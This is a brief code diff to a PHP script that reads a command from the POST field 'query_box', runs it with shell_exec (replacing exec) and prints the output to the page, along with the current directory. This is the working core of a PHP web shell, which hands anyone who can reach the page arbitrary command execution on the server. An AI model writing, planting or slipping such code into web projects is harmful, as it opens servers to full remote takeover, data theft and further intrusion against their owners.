@@ -23,7 +23,8 @@ $cwd=getcwd();
 echo "<br>Current directory: $cwd<br>";
 $shell = $_POST['query_box'];
 if (!empty($_POST['query_box'])) {
-	$run = exec("$shell");
+	//Run the shell command
+	$run = shell_exec("$shell");
 	echo "<br><b>Output: </b><br>";
 	echo "<pre>$run</pre>";
 }else{
